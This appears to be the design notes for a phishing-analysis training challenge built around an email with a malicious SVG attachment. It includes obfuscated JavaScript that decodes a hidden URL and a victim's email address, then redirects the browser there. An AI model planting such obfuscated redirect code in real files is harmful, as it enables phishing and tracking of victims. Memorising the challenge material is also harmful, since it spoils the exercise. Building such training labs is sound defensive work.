# Stealthy Vector Graphucs

A user at E-Corp reported an email with a suspicious attachment.

Could you please analyse the email `report.eml` and get back to us with your findings?

## Design

Checklist:
- [x] Email generator 
- [~] Malicious SVG
    - [X] Obfuscation
    - [~] Redirect to suspicious website
- [X] Quiz

#### Malicious SVG

Base64-encode:

```javascript
email = 'd6f636e20727f636d256042756b6271607f6';
url = 'K0TY/8Cdz9GasF2Yvx2LvoDc0RHa';

...

function fromReversedHex(str) {
    const fixed_hex = str.split('').reverse().join('');
    const bytes = new Uint8Array(fixed_hex.length / 2);
    for (let i = 0; i < fixed_hex.length; i += 2)
        bytes[i/2] = parseInt(fixed_hex.substr(i, 2), 16);
    return new TextDecoder().decode(bytes);
}

try {
    (async function () {
        window.location.href = atob(url) + fromReversedHex(email);
	})();
} catch (e) {
  console.error("e:", e);
}
```